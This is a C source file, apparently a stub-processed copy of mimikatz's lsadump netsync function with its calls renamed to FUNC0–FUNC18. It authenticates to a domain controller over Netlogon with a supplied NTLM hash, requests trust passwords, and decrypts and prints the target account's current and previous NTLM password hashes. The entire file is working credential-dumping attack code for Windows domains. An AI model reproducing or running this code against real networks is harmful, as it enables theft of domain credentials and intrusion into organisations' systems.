#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int /*<<< orphan*/  sessionKey ;
typedef  int /*<<< orphan*/  ntlmHash ;
typedef  int /*<<< orphan*/  i ;
struct TYPE_12__ {int /*<<< orphan*/  digest; } ;
struct TYPE_11__ {char member_0; char member_1; char member_2; char member_3; char member_4; char member_5; char member_6; char member_7; size_t* data; } ;
typedef  int* PDWORD64 ;
typedef  int /*<<< orphan*/ * PCWCHAR ;
typedef  int /*<<< orphan*/  PBYTE ;
typedef  int /*<<< orphan*/  NT_OWF_PASSWORD ;
typedef  scalar_t__ NTSTATUS ;
typedef  TYPE_1__ NETLOGON_CREDENTIAL ;
typedef  int /*<<< orphan*/  NETLOGON_AUTHENTICATOR ;
typedef  TYPE_2__ MD5_CTX ;
typedef  int /*<<< orphan*/  LPCBYTE ;
typedef  int /*<<< orphan*/  LPBYTE ;
typedef  int /*<<< orphan*/  LOGONSRV_HANDLE ;
typedef  int /*<<< orphan*/  ENCRYPTED_NT_OWF_PASSWORD ;
typedef  size_t DWORD ;
typedef  int /*<<< orphan*/  BYTE ;

/* Variables and functions */
 size_t FUNC0 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  CALG_MD5 ; 
 scalar_t__ FUNC1 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,TYPE_1__*,TYPE_1__*,size_t*) ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,TYPE_1__*,TYPE_1__*) ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int LM_NTLM_HASH_LENGTH ; 
 int /*<<< orphan*/  FUNC4 (TYPE_2__*) ; 
 int /*<<< orphan*/  FUNC5 (TYPE_2__*) ; 
 int /*<<< orphan*/  FUNC6 (TYPE_2__*,size_t*,int) ; 
 int MD5_DIGEST_LENGTH ; 
 int /*<<< orphan*/ * MIMIKATZ ; 
 scalar_t__ FUNC7 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC10 (size_t*,size_t*,int) ; 
 scalar_t__ STATUS_NO_SUCH_USER ; 
 scalar_t__ STATUS_SUCCESS ; 
 int /*<<< orphan*/  ServerSecureChannel ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int /*<<< orphan*/  FUNC12 (TYPE_1__*,int,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * kuhl_m_lsadump_netsync_sc ; 
 scalar_t__ FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int,int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int) ; 
 scalar_t__ FUNC15 (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ **,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC16 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC17 (int /*<<< orphan*/ *,int,int /*<<< orphan*/ ) ; 

NTSTATUS FUNC18(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
	NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
	DWORD i = 0, NegotiateFlags = 0x600FFFFF;
	MD5_CTX ctx;
	ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
	NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
	PCWCHAR szDc, szComputer, szUser, szNtlm, szAccount;

	if(FUNC15(argc, argv, L"dc", &szDc, NULL))
	{
		if(FUNC15(argc, argv, L"user", &szUser, NULL))
		{
			FUNC15(argc, argv, L"account", &szAccount, szUser);
			FUNC15(argc, argv, L"computer", &szComputer, MIMIKATZ);
			if(FUNC15(argc, argv, L"ntlm", &szNtlm, NULL))
			{
				if(FUNC16(szNtlm, ntlmHash, sizeof(ntlmHash)))
				{
					//kprintf(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); kprintf(L"\n");
					status = FUNC2((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
					if(FUNC7(status))
					{
						//kprintf(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); kprintf(L"\n");
						FUNC5(&ctx);
						FUNC6(&ctx, &i, sizeof(i));
						FUNC6(&ctx, ClientChallenge.data, sizeof(ClientChallenge.data));
						FUNC6(&ctx, ServerChallenge.data, sizeof(ServerChallenge.data));
						FUNC4(&ctx);
						if(FUNC14(CALG_MD5, ntlmHash, sizeof(ntlmHash), ctx.digest, sizeof(ctx.digest), sessionKey, sizeof(sessionKey)))
						{
							//kprintf(L"> Session Key              : "); kull_m_string_wprintf_hex(sessionKey, sizeof(sessionKey), 0); kprintf(L"\n");
							FUNC13((PBYTE) ClientChallenge.data, (PBYTE) ClientCredential.data, sessionKey);
							FUNC13((PBYTE) ServerChallenge.data, (PBYTE) CandidateServerCredential.data, sessionKey);
							//kprintf(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
							status = FUNC1((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
							if(FUNC7(status))
							{
								//kprintf(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); kprintf(L"\n");
								if(FUNC10(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
								{
									//kprintf(L"< NegotiateFlags           : 0x%08x\n", NegotiateFlags);
									for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < FUNC0(kuhl_m_lsadump_netsync_sc)); i++)
									{
										FUNC12(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
										status = FUNC3((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
										if(FUNC7(status))
										{
											FUNC11(L"  Account: %s\n", szAccount);
											FUNC9((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
											FUNC9((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
											FUNC11(L"  NTLM   : "); FUNC17(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); FUNC11(L"\n");
											FUNC11(L"  NTLM-1 : "); FUNC17(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); FUNC11(L"\n");
										}
										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
									}
									if(!FUNC7(status))
										FUNC8(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
								}
								else FUNC8(L"ServerCredential does not match CandidateServerCredential\n");
							}
							else FUNC8(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
						}
					}
					else FUNC8(L"I_NetServerReqChallenge (0x%08x)\n", status);
				}
				else FUNC8(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
			}
			else FUNC8(L"Missing argument : ntlm\n");
		}
		else FUNC8(L"Missing argument : user\n");
	}
	else FUNC8(L"Missing argument : dc\n");
	return STATUS_SUCCESS;
}